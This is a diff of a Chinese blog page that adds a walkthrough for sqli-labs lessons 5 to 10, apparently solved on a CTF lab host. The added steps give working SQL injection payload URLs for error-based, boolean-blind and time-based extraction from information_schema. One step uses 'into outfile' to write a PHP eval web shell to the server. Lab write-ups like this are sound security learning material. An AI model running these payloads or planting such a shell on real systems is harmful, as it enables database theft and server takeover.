@@ -544,7 +544,7 @@
 <hr>
 <h2 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h2><ul>
 <li><p>判断为字符型注入还是数字型注入</p>
-<p>由于回显报错数据，尝试盲注</p>
+<p>回显报错数据，尝试盲注</p>
 <p><img src="https://www.helloimg.com/images/2021/12/05/GetUSz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetUSz.png" srcset="data:image/png;base64,666" alt="GetUSz.png"></p>
 </li>
 </ul>
@@ -568,7 +568,65 @@
 <li>列名以此类推</li>
 </ul>
 <p>可以用python写个脚本来跑，或者使用burpsuite</p>
+<p>另外，还可以使用updataxml()函数来获取相关信息</p>
+<p><img src="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" srcset="data:image/png;base64,666" alt="Gi3aM0.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+</a></p>
+<hr>
 <h2 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h2><p>与上一道题类似，将单引号换为双引号</p>
+<hr>
+<h2 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h2><ul>
+<li>利用永真永假的条件配合and和or判断参数id的闭合方式</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/Gi318m.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi318m.png" srcset="data:image/png;base64,666" alt="Gi318m.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+</a></p>
+<hr>
+<ul>
+<li>利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" srcset="data:image/png;base64,666" alt="Gi3PX5.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;</a>)) union select 1,’2’,”<?php @eval($_POST['hahaha'];)?>“ into outfile “./“ –+</p>
+<p>由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断</p>
+<hr>
+<h2 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h2><ul>
+<li>判断参数闭合方式</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" srcset="data:image/png;base64,666" alt="GiXeU9.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+</a></p>
+<hr>
+<ul>
+<li>由于注入错误时不回显，因此可以使用上述的盲注</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/GiXEng.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXEng.png" srcset="data:image/png;base64,666" alt="GiXEng.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p>
+<hr>
+<ul>
+<li>往后步骤与上述盲注步骤一致</li>
+</ul>
+<hr>
+<h2 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h2><ul>
+<li>在判断参数闭合方式时，发现回显不改变</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" srcset="data:image/png;base64,666" alt="GiX3qE.png"></p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+</a></p>
+<hr>
+<ul>
+<li>尝试基于时间的盲注</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" srcset="data:image/png;base64,666" alt="GiXxPX.png"></p>
+<p>可以看到网页根据设定的时间正在加载，说明注入成功</p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+</a></p>
+<hr>
+<ul>
+<li>接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果</li>
+</ul>
+<p><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"></p>
+<p>payload取上述盲注payload的查询部分</p>
+<p><strong>payload</strong>：<a target="_blank" rel="noopener" href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+</a></p>
+<hr>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><ul>
+<li>将闭合参数的单引号替换为双引号，其余一致</li>
+</ul>
+<hr>
 
   
   
@@ -603,10 +661,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-12-05T12:27:43+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-12-12T11:03:07+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2021年12月5日</p>
+    <p>更新于：2021年12月12日</p>
   </a>
 </div>
 
@@ -755,7 +813,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-01"><span class="toc-text">Less-01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-02"><span class="toc-text">Less-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-03"><span class="toc-text">Less-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-04"><span class="toc-text">Less-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-05"><span class="toc-text">Less-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-06"><span class="toc-text">Less-06</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-01"><span class="toc-text">Less-01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-02"><span class="toc-text">Less-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-03"><span class="toc-text">Less-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-04"><span class="toc-text">Less-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-05"><span class="toc-text">Less-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-06"><span class="toc-text">Less-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-07"><span class="toc-text">Less-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-08"><span class="toc-text">Less-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-09"><span class="toc-text">Less-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10"><span class="toc-text">Less-10</span></a></li></ol>
     </div>
   </section>
 
